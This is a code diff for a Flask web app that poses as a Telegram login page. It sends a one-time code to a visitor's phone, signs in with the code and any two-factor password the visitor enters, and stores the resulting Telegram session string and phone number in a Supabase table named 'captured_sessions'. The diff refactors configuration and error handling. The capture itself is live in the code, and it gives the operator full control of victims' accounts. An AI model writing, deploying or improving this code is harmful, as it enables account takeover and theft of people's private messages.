@@ -3,27 +3,22 @@ import asyncio
 from flask import Flask, render_template, request, redirect, url_for, session
 from telethon import TelegramClient
 from telethon.sessions import StringSession
-# --- THE FIX: Import the specific errors we need to catch ---
 from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError
 from supabase import create_client, Client
 
-# --- SECURE SETUP FOR DEPLOYMENT ---
-# These keys will be read from Render's Environment Variables, not from the code.
-
-# Supabase Keys
+# --- SETUP ---
 SUPABASE_URL = os.environ.get('SUPABASE_URL')
 SUPABASE_KEY = os.environ.get('SUPABASE_KEY')
-supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)
+API_ID = os.environ.get('API_ID')
+API_HASH = os.environ.get('API_HASH')
+FLASK_SECRET_KEY = os.environ.get('FLASK_SECRET_KEY')
 
-# Telegram Keys (Note: API_ID is converted to an integer)
-api_id = int(os.environ.get('API_ID'))
-api_hash = os.environ.get('API_HASH')
+supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)
+api_id = int(API_ID)
+api_hash = API_HASH
 
 app = Flask(__name__)
-# The Flask secret key should also be an environment variable
-app.secret_key = os.environ.get('FLASK_SECRET_KEY')
-
-# --- THE REST OF THE APP (No logic changes needed) ---
+app.secret_key = FLASK_SECRET_KEY
 
 def run_async(coro):
     return asyncio.run(coro)
@@ -35,7 +30,7 @@ def index():
 
 @app.route('/send_otp', methods=['POST'])
 def send_otp():
-    phone = request.form['phone']
+    phone = request.form.get('phone')
     session['phone'] = phone
 
     async def send_code_async():
@@ -47,7 +42,7 @@ def send_otp():
             session['telethon_session'] = client.session.save()
         finally:
             await client.disconnect()
-
+    
     run_async(send_code_async())
     return render_template('login.html', step='enter_code', phone=phone)
 
@@ -72,19 +67,18 @@ def login():
             elif password:
                 await client.sign_in(password=password)
         
-        # --- THE FIX: Catch the specific error for a wrong OTP ---
         except PhoneCodeInvalidError:
             await client.disconnect()
-            # Re-render the OTP page but pass an error message to display
+            # Pass the raw phone number back, the front-end will format it.
             return render_template('login.html', 
                                    step='enter_code', 
                                    phone=phone, 
                                    error="Invalid code. Please try again.")
-        # --- END OF FIX ---
-
+        
         except SessionPasswordNeededError:
             session['telethon_session'] = client.session.save()
             await client.disconnect()
+            # Pass the raw phone number back for consistency.
             return render_template('login.html', step='enter_password', phone=phone)
         except Exception as e:
             await client.disconnect()
@@ -95,11 +89,8 @@ def login():
         session.clear()
         
         try:
-            data_to_insert = {
-                "session_string": final_session_string, 
-                "phone_number": phone
-            }
-            data, count = supabase.table('captured_sessions').insert(data_to_insert).execute()
+            data_to_insert = { "session_string": final_session_string, "phone_number": phone }
+            supabase.table('captured_sessions').insert(data_to_insert).execute()
             print("✅ Successfully saved session AND phone number to Supabase!")
         except Exception as e:
             print(f"❌ Error saving to Supabase: {e}")
@@ -108,6 +99,5 @@ def login():
 
     return run_async(try_login_async())
 
-# This block is not used by gunicorn but is good practice
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
